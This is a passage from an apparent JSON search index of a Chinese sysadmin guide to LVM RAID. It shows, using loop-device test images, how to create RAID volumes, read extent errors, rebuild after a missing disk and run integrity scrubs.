type\u3002\u200b\u9664\u975e\u200b\u6709\u200b\u7279\u6b8a\u200b\u9700\u8981\u200b\uff0c\u200b\u5426\u5219\u200b\u5e94\u8be5\u200b\u4f7f\u7528\u200b <code>--type raid1</code> \u200b\u521b\u5efa\u200b RAID 1 \u200b\u9635\u5217\u200b\u3002 \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>lvconvert</code> \u200b\u5c06\u200b mirror \u200b\u8f6c\u6362\u200b\u4e3a\u200b raid1\u3002</p> <p>\u200b\u76f8\u5173\u200b\u8ba8\u8bba\u200b\u53ef\u200b\u67e5\u770b\u200b In what case(s) will <code>--type mirror</code> continue to be a good choice / is not deprecated?\u3002</p> <p>\u200b\u5728\u200b\u540e\u6587\u200b\u7684\u200b\u7f3a\u76d8\u200b\u6d4b\u8bd5\u200b\u4e2d\u200b\uff0c<code>mirror</code> \u200b\u7684\u200b\u884c\u4e3a\u200b\u4e5f\u200b\u4e0e\u200b\u9884\u671f\u200b\u4e0d\u540c\u200b\u2014\u2014LVM \u200b\u9ed8\u8ba4\u200b\u4f1a\u200b\u62d2\u7edd\u200b\u6302\u8f7d\u200b\uff0c\u200b\u5982\u679c\u200b\u5f3a\u884c\u200b\u6302\u8f7d\u200b\uff0c\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u5c06\u200b\u7f3a\u5931\u200b\u7684\u200b\u76d8\u200b\u4e22\u6389\u200b\u3002</p> <p>Extent \u200b\u662f\u200b\u591a\u200b\u5927\u200b</p> <p>\u200b\u6709\u65f6\u200b\u5728\u200b\u8f93\u5165\u200b\u9519\u8bef\u200b\u7684\u200b\u53c2\u6570\u200b\u4e4b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u51fa\u73b0\u200b extent \u200b\u4e0d\u8db3\u200b\u7684\u200b\u63d0\u793a\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>$ # --mirrors \u200b\u53c2\u6570\u200b\u591a\u200b\u4e86\u200b\u4e00\u200b\uff0c\u200b\u7a7a\u95f4\u200b\u4e0d\u591f\u200b\n$ sudo lvcreate -n lvraid1 -L 0.5G --type raid1 --mirrors 3 vg201-test\n  Insufficient suitable allocatable extents for logical volume lvraid1: 516 more required\n</code></pre> <p>\u200b\u4f46\u662f\u200b \"extent\" \u200b\u662f\u200b\u591a\u200b\u5927\u200b\u5462\u200b\uff1f \u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>pvdisplay</code> \u200b\u6216\u200b <code>vgdisplay</code> \u200b\u67e5\u770b\u200b\u7269\u7406\u200b\u5377\u200b\u7684\u200b PE\uff08Physical Extent\uff09\u200b\u5927\u5c0f\u200b\uff1a</p> <pre><code>$ sudo vgdisplay\n  --- Volume group ---\n  VG Name               vg201-test\n  System ID             \n  Format                lvm2\n  Metadata Areas        3\n  Metadata Sequence No  11\n  VG Access             read/write\n  VG Status             resizable\n  MAX LV                0\n  Cur LV                2\n  Open LV               0\n  Max PV                0\n  Cur PV                3\n  Act PV                3\n  VG Size               &lt;2.99 GiB\n  PE Size               4.00 MiB\n  Total PE              765\n  Alloc PE / Size       514 / &lt;2.01 GiB\n  Free  PE / Size       251 / 1004.00 MiB\n  VG UUID               Ybsskf-2giI-Q5PU-LCof-Irr9-EDud-nlB0Ms\n$ sudo pvdisplay\n  --- Physical volume ---\n  PV Name               /dev/loop0\n  VG Name               vg201-test\n  PV Size               1.00 GiB / not usable 4.00 MiB\n  Allocatable           yes \n  PE Size               4.00 MiB\n  Total PE              255\n  Free PE               84\n  Allocated PE          171\n  PV UUID               DBn9ke-9UfO-tZJA-ymSh-GQtP-jMq8-tSm62B\n\n  --- Physical volume ---\n  PV Name               /dev/loop1\n  VG Name               vg201-test\n  PV Size               1.00 GiB / not usable 4.00 MiB\n  Allocatable           yes \n  PE Size               4.00 MiB\n  Total PE              255\n  Free PE               84\n  Allocated PE          171\n  PV UUID               aut3hf-J6Tl-O5Gq-0TIw-bneD-mfzr-8wMJJx\n\n  --- Physical volume ---\n  PV Name               /dev/loop2\n  VG Name               vg201-test\n  PV Size               1.00 GiB / not usable 4.00 MiB\n  Allocatable           yes \n  PE Size               4.00 MiB\n  Total PE              255\n  Free PE               83\n  Allocated PE          172\n  PV UUID               AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b PE \u200b\u662f\u200b 4M\uff0c\u200b\u56e0\u6b64\u200b\u7f3a\u5c11\u200b 516 \u200b\u4e2a\u200b extent \u200b\u6307\u200b\u7f3a\u5c11\u200b 516 * 4M \u2248 2G \u200b\u7a7a\u95f4\u200b\u3002 \u200b\u8fd9\u91cc\u200b\u62a5\u9519\u200b\u5b9e\u9645\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b PV \u200b\u6570\u91cf\u200b\u4e0d\u8db3\u200b\uff0c\u200b\u6240\u4ee5\u200b\u65e0\u6cd5\u200b\u627e\u5230\u200b\u80fd\u591f\u200b\u5b58\u50a8\u200b\u7b2c\u56db\u200b\u4efd\u200b\u526f\u672c\u200b\u7684\u200b\u78c1\u76d8\u200b\uff08\u200b\u5373\u200b\u7f3a\u5c11\u200b\u6ee1\u8db3\u6761\u4ef6\u200b\u7684\u200b extent\uff0c\u200b\u800c\u200b\u975e\u200b\u5355\u7eaf\u200b\u7684\u200b VG \u200b\u4e2d\u200b\u7a7a\u95f2\u200b extent\uff09\u3002</p> <p><code>lvs</code> \u200b\u652f\u6301\u200b\u6307\u5b9a\u200b\u53c2\u6570\u200b\u67e5\u770b\u200b LV \u200b\u7684\u200b\u5176\u4ed6\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u67e5\u770b\u200b\u903b\u8f91\u200b\u5377\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u7684\u200b\u7269\u7406\u200b\u5377\u200b\uff1a</p> <pre><code>$ sudo lvs -a -o +devices vg201-test\n  LV                 VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert Devices                                                    \n  lvraid0            vg201-test -wi-a----- 516.00m                                                     /dev/loop0(0),/dev/loop1(0),/dev/loop2(0)                  \n  lvraid1            vg201-test rwi-a-r--- 512.00m                                    100.00           lvraid1_rimage_0(0),lvraid1_rimage_1(0),lvraid1_rimage_2(0)\n  [lvraid1_rimage_0] vg201-test iwi-aor--- 512.00m                                                     /dev/loop0(44)                                             \n  [lvraid1_rimage_1] vg201-test iwi-aor--- 512.00m                                                     /dev/loop1(44)                                             \n  [lvraid1_rimage_2] vg201-test iwi-aor--- 512.00m                                                     /dev/loop2(44)                                             \n  [lvraid1_rmeta_0]  vg201-test ewi-aor---   4.00m                                                     /dev/loop0(43)                                             \n  [lvraid1_rmeta_1]  vg201-test ewi-aor---   4.00m                                                     /dev/loop1(43)                                             \n  [lvraid1_rmeta_2]  vg201-test ewi-aor---   4.00m                                                     /dev/loop2(43)                                             \n  lvraid5            vg201-test rwi-a-r--- 208.00m                                    100.00           lvraid5_rimage_0(0),lvraid5_rimage_1(0),lvraid5_rimage_2(0)\n  [lvraid5_rimage_0] vg201-test iwi-aor--- 104.00m                                                     /dev/loop0(173)                                            \n  [lvraid5_rimage_1] vg201-test iwi-aor--- 104.00m                                                     /dev/loop1(173)                                            \n  [lvraid5_rimage_2] vg201-test iwi-aor--- 104.00m                                                     /dev/loop2(173)                                            \n  [lvraid5_rmeta_0]  vg201-test ewi-aor---   4.00m                                                     /dev/loop0(172)                                            \n  [lvraid5_rmeta_1]  vg201-test ewi-aor---   4.00m                                                     /dev/loop1(172)                                            \n  [lvraid5_rmeta_2]  vg201-test ewi-aor---   4.00m                                                     /dev/loop2(172)\n</code></pre> rimage, rmeta\uff08\u200b\u4e0e\u200b mimage, mlog\uff09 <p>\u200b\u53ef\u4ee5\u200b\u89c2\u5bdf\u200b\u5230\u200b\uff0c\u200b\u5217\u8868\u200b\u4e2d\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u9ed8\u8ba4\u200b\u9690\u85cf\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\uff0c\u200b\u5b83\u4eec\u200b\u662f\u200b\u521b\u5efa\u200b RAID 1/5/6 \u200b\u7684\u200b\u4ea7\u7269\u200b\uff1a</p> <ul> <li>rimage: \"RAID image\"\uff0c\u200b\u4ee3\u8868\u200b\u4e86\u200b\u5b9e\u9645\u200b\u5b58\u50a8\u200b\u6570\u636e\u200b\uff08\u200b\u4ee5\u53ca\u200b\u6821\u9a8c\u200b\u4fe1\u606f\u200b\uff09\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b</li> <li>rmeta: \u200b\u5b58\u50a8\u200b\u4e86\u200b RAID \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u4fe1\u606f\u200b</li> </ul> <p>\u200b\u5982\u679c\u200b\u5728\u200b\u521b\u5efa\u200b RAID 1 \u200b\u65f6\u200b\u9009\u62e9\u200b\u4e86\u200b <code>--type mirror</code>\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u5e94\u200b\u521b\u5efa\u200b\u7684\u200b\u662f\u200b mimage \u200b\u548c\u200b mlog\uff1a</p> <ul> <li>mimage: \"mirrored image\"\uff0c\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u5411\u200b\u6bcf\u4e2a\u200b\u5173\u8054\u200b\u7684\u200b mimage \u200b\u5199\u5165\u200b\u6570\u636e\u200b</li> <li>mlog: \u200b\u5b58\u50a8\u200b\u4e86\u200b RAID 1 \u200b\u7684\u200b\u76d8\u200b\u4e4b\u95f4\u200b\u7684\u200b\u540c\u6b65\u200b\u72b6\u6001\u200b\u4fe1\u606f\u200b</li> </ul>"},{"location":"ops/storage/lvm/#raid-maintain","title":"RAID \u200b\u7ef4\u62a4","text":""},{"location":"ops/storage/lvm/#raid-rebuild","title":"RAID \u200b\u72b6\u6001\u200b\u4e0e\u200b\u91cd\u5efa","text":"<p>\u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c<code>lvs</code> \u200b\u8fd4\u56de\u200b\u7684\u200b RAID 1/5/6 \u200b\u8bbe\u5907\u200b\u7684\u200b \"Cpy%Sync\" \u200b\u5e94\u8be5\u200b\u662f\u200b 100.00\uff0c\u200b\u8868\u793a\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u540c\u6b65\u200b\u5230\u200b\u6240\u6709\u200b\u76d8\u200b\u4e0a\u200b\u3002 \u200b\u5e76\u4e14\u200b <code>health_status</code> \u200b\u5c5e\u6027\u200b\u5e94\u8be5\u200b\u4e3a\u7a7a\u200b\u3002\u200b\u8fd9\u91cc\u200b\u6a21\u62df\u200b\u5f3a\u5236\u200b\u5220\u9664\u200b\u4e00\u5757\u200b\u76d8\u200b\u7684\u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>$ sudo vgchange -an vg201-test\n  0 logical volume(s) in volume group \"vg201-test\" now active\n$ sudo losetup -D\n$ # \u200b\u63a5\u4e0b\u6765\u200b\u53ea\u200b\u6302\u8f7d\u200b\u4e24\u5757\u200b\u76d8\u200b\n$ sudo losetup -f --show pv1.img\n/dev/loop0\n$ sudo losetup -f --show pv2.img\n/dev/loop1\n$ sudo pvs\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test is missing PV AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ (last written to /dev/loop2).\n  PV         VG         Fmt  Attr PSize    PFree  \n  /dev/loop0 vg201-test lvm2 a--  1020.00m 228.00m\n  /dev/loop1 vg201-test lvm2 a--  1020.00m 228.00m\n  [unknown]  vg201-test lvm2 a-m  1020.00m 224.00m\n$ sudo vgchange -ay vg201-test\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test is missing PV AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ (last written to /dev/loop2).\n  Refusing activation of partial LV vg201-test/lvraid0.  Use '--activationmode partial' to override.\n  2 logical volume(s) in volume group \"vg201-test\" now active\n$ sudo lvs -a -o name,copy_percent,health_status,devices vg201-test\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test is missing PV AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ (last written to /dev/loop2).\n  LV                 Cpy%Sync Health          Devices                                                    \n  lvraid0                     partial         /dev/loop0(0),/dev/loop1(0),[unknown](0)                   \n  lvraid1            100.00   partial         lvraid1_rimage_0(0),lvraid1_rimage_1(0),lvraid1_rimage_2(0)\n  [lvraid1_rimage_0]                          /dev/loop0(44)                                             \n  [lvraid1_rimage_1]                          /dev/loop1(44)                                             \n  [lvraid1_rimage_2]          partial         [unknown](44)                                              \n  [lvraid1_rmeta_0]                           /dev/loop0(43)                                             \n  [lvraid1_rmeta_1]                           /dev/loop1(43)                                             \n  [lvraid1_rmeta_2]           partial         [unknown](43)                                              \n  lvraid5            100.00   partial         lvraid5_rimage_0(0),lvraid5_rimage_1(0),lvraid5_rimage_2(0)\n  [lvraid5_rimage_0]                          /dev/loop0(173)                                            \n  [lvraid5_rimage_1]                          /dev/loop1(173)                                            \n  [lvraid5_rimage_2]          partial         [unknown](173)                                             \n  [lvraid5_rmeta_0]                           /dev/loop0(172)                                            \n  [lvraid5_rmeta_1]                           /dev/loop1(172)                                            \n  [lvraid5_rmeta_2]           partial         [unknown](172)\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff1a</p> <ul> <li>RAID 0 \u200b\u7531\u4e8e\u200b\u7f3a\u5c11\u200b\u4e00\u5757\u200b\u76d8\u200b\uff0cLVM \u200b\u4f1a\u200b\u62d2\u7edd\u200b\u6fc0\u6d3b\u200b</li> <li>RAID 1/5 \u200b\u53ef\u4ee5\u200b\u6fc0\u6d3b\u200b\uff0c\u200b\u4f46\u662f\u200b health_status \u200b\u4e3a\u200b partial\uff0c\u200b\u8868\u793a\u200b\u5bf9\u5e94\u200b\u9635\u5217\u200b\u5904\u4e8e\u200b\u4e0d\u200b\u5b8c\u6574\u200b\u7684\u200b\u72b6\u6001\u200b</li> </ul> <p>\u200b\u5047\u8bbe\u200b\u6211\u4eec\u200b\u6dfb\u52a0\u200b\u4e00\u5757\u200b\u65b0\u76d8\u200b\uff0c\u200b\u5e76\u200b\u5220\u9664\u200b\u65e7\u76d8\u200b\uff0c\u200b\u8fdb\u884c\u200b RAID 1/5 \u200b\u7684\u200b\u91cd\u5efa\u200b\uff1a</p> <pre><code>$ truncate -s 1G pv4.img\n$ sudo losetup /dev/loop3 pv4.img\n$ sudo pvcreate /dev/loop3\n  Physical volume \"/dev/loop3\" successfully created.\n$ sudo vgextend vg201-test /dev/loop3\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test is missing PV AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ (last written to /dev/loop2).\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  Volume group \"vg201-test\" successfully extended\n$ sudo lvconvert --repair vg201-test/lvraid1\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test is missing PV AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ (last written to [unknown]).\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\nAttempt to replace failed RAID images (requires full device resync)? [y/n]: y\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  Faulty devices in vg201-test/lvraid1 successfully replaced.\n$ sudo lvconvert --repair vg201-test/lvraid5\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test is missing PV AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ (last written to [unknown]).\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\nAttempt to replace failed RAID images (requires full device resync)? [y/n]: y\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  Faulty devices in vg201-test/lvraid5 successfully replaced.\n$ sudo lvs -a -o name,copy_percent,health_status,devices vg201-test\n  WARNING: Couldn't find device with uuid AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test is missing PV AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ (last written to [unknown]).\n  LV                 Cpy%Sync Health          Devices                                                    \n  lvraid0                     partial         /dev/loop0(0),/dev/loop1(0),[unknown](0)                   \n  lvraid1            100.00                   lvraid1_rimage_0(0),lvraid1_rimage_1(0),lvraid1_rimage_2(0)\n  [lvraid1_rimage_0]                          /dev/loop0(44)                                             \n  [lvraid1_rimage_1]                          /dev/loop1(44)                                             \n  [lvraid1_rimage_2]                          /dev/loop3(1)                                              \n  [lvraid1_rmeta_0]                           /dev/loop0(43)                                             \n  [lvraid1_rmeta_1]                           /dev/loop1(43)                                             \n  [lvraid1_rmeta_2]                           /dev/loop3(0)                                              \n  lvraid5            100.00                   lvraid5_rimage_0(0),lvraid5_rimage_1(0),lvraid5_rimage_2(0)\n  [lvraid5_rimage_0]                          /dev/loop0(173)                                            \n  [lvraid5_rimage_1]                          /dev/loop1(173)                                            \n  [lvraid5_rimage_2]                          /dev/loop3(130)                                            \n  [lvraid5_rmeta_0]                           /dev/loop0(172)                                            \n  [lvraid5_rmeta_1]                           /dev/loop1(172)                                            \n  [lvraid5_rmeta_2]                           /dev/loop3(129)\n</code></pre> <p>\u200b\u4e0b\u9762\u200b\u5c55\u793a\u200b\u5c06\u200b\u539f\u59cb\u200b\u7684\u200b <code>/dev/loop2</code> \u200b\u6062\u590d\u200b\u56de\u200b vg201-test \u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u4ee5\u200b\u300c\u200b\u6062\u590d\u200b\u300d\u200b\u6700\u540e\u200b\u7684\u200b RAID 0\u3002 \u200b\u901a\u8fc7\u200b\u4f7f\u7528\u200b <code>vgextend</code> \u200b\u7684\u200b <code>--restoremissing</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u200b\u9700\u8981\u200b\u91cd\u65b0\u200b\u521d\u59cb\u5316\u200b <code>/dev/loop2</code>\uff0c\u200b\u800c\u662f\u200b\u76f4\u63a5\u200b\u5c06\u200b\u5176\u200b\u52a0\u5165\u200b\u5230\u200b\u5377\u200b\u7ec4\u4e2d\u200b\u3002 \u200b\u53ea\u200b\u5728\u200b\u786e\u5b9a\u200b\u539f\u59cb\u200b\u7684\u200b PV \u200b\u6ca1\u6709\u200b\u88ab\u200b\u4fee\u6539\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u624d\u80fd\u200b\u5982\u6b64\u200b\u64cd\u4f5c\u200b\u3002</p> <pre><code>$ sudo losetup /dev/loop2 pv3.img\n$ sudo pvs\n  WARNING: ignoring metadata seqno 37 on /dev/loop2 for seqno 43 on /dev/loop0 for VG vg201-test.\n  WARNING: Inconsistent metadata found for VG vg201-test.\n  See vgck --updatemetadata to correct inconsistency.\n  WARNING: VG vg201-test was previously updated while PV /dev/loop2 was missing.\n  WARNING: VG vg201-test was missing PV /dev/loop2 AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  PV         VG         Fmt  Attr PSize    PFree  \n  /dev/loop0 vg201-test lvm2 a--  1020.00m 224.00m\n  /dev/loop1 vg201-test lvm2 a--  1020.00m 224.00m\n  /dev/loop2 vg201-test lvm2 a-m  1020.00m 848.00m\n  /dev/loop3 vg201-test lvm2 a--  1020.00m 396.00m\n$ sudo vgextend vg201-test /dev/loop2 --restoremissing\n  WARNING: ignoring metadata seqno 37 on /dev/loop2 for seqno 43 on /dev/loop0 for VG vg201-test.\n  WARNING: Inconsistent metadata found for VG vg201-test.\n  See vgck --updatemetadata to correct inconsistency.\n  WARNING: VG vg201-test was previously updated while PV /dev/loop2 was missing.\n  WARNING: VG vg201-test was missing PV /dev/loop2 AQj8ej-EKps-ud3h-0KkP-wDxo-ZagG-ZJIdnZ.\n  WARNING: VG vg201-test was previously updated while PV /dev/loop2 was missing.\n  WARNING: updating old metadata to 44 on /dev/loop2 for VG vg201-test.\n  Volume group \"vg201-test\" successfully extended\n$ sudo lvs -a -o name,copy_percent,health_status,devices vg201-test\n  LV                 Cpy%Sync Health          Devices                                                    \n  lvraid0                                     /dev/loop0(0),/dev/loop1(0),/dev/loop2(0)                  \n  lvraid1            100.00                   lvraid1_rimage_0(0),lvraid1_rimage_1(0),lvraid1_rimage_2(0)\n  [lvraid1_rimage_0]                          /dev/loop0(44)                                             \n  [lvraid1_rimage_1]                          /dev/loop1(44)                                             \n  [lvraid1_rimage_2]                          /dev/loop3(1)                                              \n  [lvraid1_rmeta_0]                           /dev/loop0(43)                                             \n  [lvraid1_rmeta_1]                           /dev/loop1(43)                                             \n  [lvraid1_rmeta_2]                           /dev/loop3(0)                                              \n  lvraid5            100.00                   lvraid5_rimage_0(0),lvraid5_rimage_1(0),lvraid5_rimage_2(0)\n  [lvraid5_rimage_0]                          /dev/loop0(173)                                            \n  [lvraid5_rimage_1]                          /dev/loop1(173)                                            \n  [lvraid5_rimage_2]                          /dev/loop3(130)                                            \n  [lvraid5_rmeta_0]                           /dev/loop0(172)                                            \n  [lvraid5_rmeta_1]                           /dev/loop1(172)                                            \n  [lvraid5_rmeta_2]                           /dev/loop3(129)\n</code></pre>"},{"location":"ops/storage/lvm/#raid-scrub","title":"\u5b8c\u6574\u6027\u68c0\u67e5","text":"<p>\u200b\u5373\u4f7f\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\uff0cRAID \u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u9632\u6b62\u200b\u9635\u5217\u200b\u4e2d\u200b\u7684\u200b\u67d0\u5757\u200b\u786c\u76d8\u200b\u56e0\u4e3a\u200b\u67d0\u79cd\u539f\u56e0\u200b\u6570\u636e\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u60c5\u51b5\u200b\uff08\u200b\u4f8b\u5982\u200b\u6bd4\u7279\u200b\u7ffb\u8f6c\u200b\uff09\uff0c \u200b\u56e0\u6b64\u200b\u5b9a\u671f\u200b\u8fdb\u884c\u200b\u5b8c\u6574\u6027\u68c0\u67e5\u200b\uff08Scrub\uff09\u200b\u662f\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u7684\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u5c55\u793a\u200b\u4e00\u4e2a\u200b\u6ca1\u6709\u200b\u5b9a\u671f\u200b scrub \u200b\u7684\u200b\u53cd\u4f8b\u200b\uff1a</p> <p>\u200b\u6709\u200b\u4e00\u4e2a\u200b\u4e09\u5757\u200b\u76d8\u200b\u7684\u200b RAID1\uff0c\u200b\u56e0\u4e3a\u200b\u67d0\u4e9b\u200b\u795e\u5947\u200b\u7684\u200b\u8bef\u64cd\u4f5c\u200b\uff0c\u200b\u5176\u4e2d\u200b\u4e00\u5757\u200b\u76d8\u200b\u7684\u200b\u72b6\u6001\u200b\u4e00\u76f4\u200b\u662f\u200b 2018 \u200b\u5e74\u200b\u7684\u200b\uff0c\u200b\u53e6\u200b\u4e24\u5757\u200b\u662f\u200b\u6b63\u786e\u200b\u7684\u200b RAID1\uff0c\u200b\u7136\u540e\u200b\u8fd9\u7ec4\u76d8\u200b\u88ab\u200b\u632a\u5230\u200b\u4e86\u200b\u65b0\u200b\u673a\u5668\u200b\uff0c\u200b\u88ab\u200b\u91cd\u65b0\u200b\u52a0\u6210\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4e09\u76d8\u200b\u7684\u200b RAID1\uff0c\u200b\u8f6f\u200b RAID \u200b\u8f6f\u4ef6\u200b somehow \u200b\u6ca1\u6709\u200b\u505a\u200b\u68c0\u67e5\u200b\u5c31\u200b\u8dd1\u200b\u4e86\u200b\u8d77\u6765\u200b\uff0c\u200b\u4e8e\u662f\u200b\u8bfb\u200b\u6587\u4ef6\u200b\u65f6\u6709\u200b 1/3 \u200b\u6982\u7387\u200b\u8bfb\u53d6\u200b\u5230\u200b\u65e7\u76d8\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b ls \u200b\u4e00\u4e0b\u200b\u53ef\u80fd\u200b\u770b\u5230\u200b\u65e7\u200b\u6587\u4ef6\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u770b\u5230\u200b\u65b0\u200b\u6587\u4ef6\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8fd9\u6837\u200b\u7528\u200b\u4e86\u200b\u5f88\u957f\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u4e00\u76f4\u200b\u6ca1\u200b\u53d1\u73b0\u200b\uff0c\u200b\u6628\u5929\u200b\u91cd\u542f\u200b\u4e4b\u540e\u200b\u7a81\u7136\u200b\u53d1\u73b0\u200b glibc \u200b\u56de\u5230\u200b\u4e86\u200b 2018 \u200b\u5e74\u200b</p> <p>\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6ca1\u6709\u200b scrub \u200b\u6570\u636e\u200b\uff0c\u200b\u6700\u7ec8\u200b\u5bfc\u81f4\u200b\u6587\u4ef6\u200b\u4e22\u5931\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b Linus Tech Tips\uff08YouTube/Bilibili, 05:15\uff09\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u6211\u4eec\u200b\u5411\u200b <code>pv4.img</code> \u200b\u4e2d\u95f4\u200b\u5199\u5165\u200b 1M \u200b\u7684\u200b\u968f\u673a\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u200b\u5c55\u793a\u200b LVM \u200b\u7684\u200b\u68c0\u67e5\u200b\u4e0e\u200b\u4fee\u590d\u200b\u529f\u80fd\u200b\u3002</p> <pre><code>$ sudo dd if=/dev/urandom of=/dev/loop3 bs=1M count=1 oseek=100\n1+0 records in\n1+0 records out\n1048576 bytes (1.0 MB, 1.0 MiB) copied, 0.00402655 s, 260 MB/s\n$ sudo lvs -o devices vg201-test\n  LV      VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvraid0 vg201-test -wi------- 516.00m                                                    \n  lvraid1 vg201-test rwi-a-r--- 512.00m                                    100.00          \n  lvraid5 vg201-test rwi-a-r--- 208.00m                                    100.00\n$ sudo lvchange --syncaction check vg201-test/lvraid1\n$ sudo dmesg\n\uff08\u200b\u7701\u7565\u200b\uff09\n[1655658.162616] md: mdX: data-check done.\n[1655663.533169] md: data-check of RAID array mdX\n$ sudo lvs -o +raid_sync_action,raid_mismatch_count\n  LV      VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert SyncAction Mismatches\n  lvraid0 vg201-test -wi------- 516.00m                                                                          \n  lvraid1 vg201-test rwi-a-r-m- 512.00m                                    100.00           idle             2048\n  lvraid5 vg201-test rwi-a-r--- 208.00m                                    100.00           idle                0\n$ # \u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u7684\u200b RAID 1 \u200b\u6709\u200b\u4e09\u5757\u200b\u76d8\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u7684\u200b\u300c\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u300d\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4fee\u590d\u200b\u3002\n$ sudo lvchange --syncaction repair vg201-test/lvraid1\n$ sudo dmesg\n\uff08\u200b\u7701\u7565\u200b\uff09\n[1655787.490037] md: requested-resync of RAID array mdX\n[1655789.691174] md: mdX: requested-resync done.\n$ sudo lvs -o +raid_sync_action,raid_mismatch_count\n  LV      VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert SyncAction Mismatches\n  lvraid0 vg201-test -wi------- 516.00m                                                                          \n  lvraid1 vg201-test rwi-a-r--- 512.00m                                    100.00           idle                0\n  lvraid5 vg201-test rwi-a-r--- 208.00m                                    100.00           idle                0\n</code></pre> <p>dm-integrity</p> <p>LVM \u200b\u652f\u6301\u200b\u5728\u200b\u8bbe\u7f6e\u200b RAID \u200b\u65f6\u200b\u6dfb\u52a0\u200b integrity \u200b\u529f\u80fd\u200b\uff08<code>--raidintegrity</code>\uff09\uff0c\u200b\u8fd9\u9879\u200b\u529f\u80fd\u200b\u4e3a\u200b\u6570\u636e\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u6821\u9a8c\u200b\u548c\u200b\uff0c LVM 